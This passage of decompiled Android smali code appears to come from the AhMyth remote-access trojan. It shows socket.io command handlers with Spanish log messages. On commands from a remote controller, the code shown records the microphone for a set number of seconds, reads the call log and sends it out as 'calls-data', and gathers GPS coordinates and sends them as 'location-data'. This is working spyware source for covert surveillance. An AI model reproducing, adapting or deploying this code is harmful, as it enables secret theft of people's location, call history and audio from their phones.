    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "Error obteniendo ubicaci\u00f3n para location-data"

    .line 234
    invoke-static {p0, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 235
    new-instance p0, Lorg/json/JSONObject;

    invoke-direct {p0}, Lorg/json/JSONObject;-><init>()V

    :try_start_1
    const-string v1, "error"

    .line 236
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 237
    :catch_1
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    aput-object p0, v1, v2

    const-string p0, "location-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :goto_0
    return-void
.end method

.method static synthetic lambda$connect$2([Ljava/lang/Object;)V
    .locals 2

    .line 88
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Error de conexi\u00f3n al socket: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v1, p0

    if-lez v1, :cond_0

    const/4 v1, 0x0

    aget-object p0, p0, v1

    goto :goto_0

    :cond_0
    const-string p0, ""

    :goto_0
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "IOSocket"

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$3([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Timeout de conexi\u00f3n al socket"

    .line 92
    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$4([Ljava/lang/Object;)V
    .locals 2

    .line 96
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Error en el socket: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v1, p0

    if-lez v1, :cond_0

    const/4 v1, 0x0

    aget-object p0, p0, v1

    goto :goto_0

    :cond_0
    const-string p0, ""

    :goto_0
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "IOSocket"

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$5([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Reconectado al socket"

    .line 100
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$6([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Intentando reconectar al socket"

    .line 104
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$7([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Fall\u00f3 la reconexi\u00f3n al socket"

    .line 108
    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$8([Ljava/lang/Object;)V
    .locals 4

    const-string v0, "MIC"

    const-string v1, "Evento mic-record recibido"

    .line 115
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const/16 v1, 0xa

    .line 118
    :try_start_0
    array-length v2, p0

    if-lez v2, :cond_2

    const/4 v2, 0x0

    .line 119
    aget-object p0, p0, v2

    .line 120
    instance-of v2, p0, Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "seconds"

    if-eqz v2, :cond_0

    .line 121
    :try_start_1
    check-cast p0, Lorg/json/JSONObject;

    invoke-virtual {p0, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    :goto_0
    move v1, p0

    goto :goto_1

    .line 122
    :cond_0
    instance-of v2, p0, Ljava/lang/String;

    if-eqz v2, :cond_1

    .line 123
    new-instance v2, Lorg/json/JSONObject;

    check-cast p0, Ljava/lang/String;

    invoke-direct {v2, p0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 124
    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    goto :goto_0

    .line 125
    :cond_1
    instance-of v2, p0, Ljava/lang/Integer;

    if-eqz v2, :cond_2

    .line 126
    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result p0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string v2, "Error leyendo segundos en mic-record"

    .line 130
    invoke-static {v0, v2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 132
    :cond_2
    :goto_1
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Ejecutando grabaci\u00f3n de micr\u00f3fono por "

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, " segundos"

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 134
    :try_start_2
    invoke-static {v1}, Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception p0

    .line 136
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Error en startRecording: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_2
    return-void
.end method

.method static synthetic lambda$connect$9([Ljava/lang/Object;)V
    .locals 3

    const-string p0, "IOSocket"

    const-string v0, "Recibido evento get-calls"

    .line 142
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 143
    invoke-static {}, Lahmyth/mine/king/ahmyth/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object p0

    .line 144
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "[]"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "calls-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$null$16(Landroid/location/Location;Ljava/lang/String;)V
    .locals 4

    .line 217
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "error"

    if-eqz p0, :cond_0

    :try_start_0
    const-string p1, "lat"

    .line 220
    invoke-virtual {p0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    invoke-virtual {v0, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string p1, "lng"

    .line 221
    invoke-virtual {p0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v2

    invoke-virtual {v0, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string p1, "accuracy"

    .line 222
    invoke-virtual {p0}, Landroid/location/Location;->getAccuracy()F

    move-result p0

    float-to-double v2, p0

    invoke-virtual {v0, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string p0, "timestamp"

    .line 223
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-virtual {v0, p0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    goto :goto_2

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_0
    if-eqz p1, :cond_1

    goto :goto_0

    :cond_1
    const-string p1, "No location available"

    .line 225
    :goto_0
    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 228
    :goto_1
    :try_start_1
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Exception: "

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 231
    :catch_1
    :goto_2
    sget-object p0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object p0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 p1, 0x1

    new-array p1, p1, [Ljava/lang/Object;

    const/4 v1, 0x0

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    aput-object v0, p1, v1

    const-string v0, "location-data"

    invoke-virtual {p0, v0, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 2

    .line 265
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "IOSocket"

    if-nez v0, :cond_0

    const-string v0, "getIoSocket() llamado pero ioSocket es null."

    .line 266
    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 267
    :cond_0
    invoke-virtual {v0}, Lio/socket/client/Socket;->connected()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "getIoSocket() llamado pero el socket NO est\u00e1 conectado."

    .line 268
    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 270
    :cond_1
    :goto_0
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
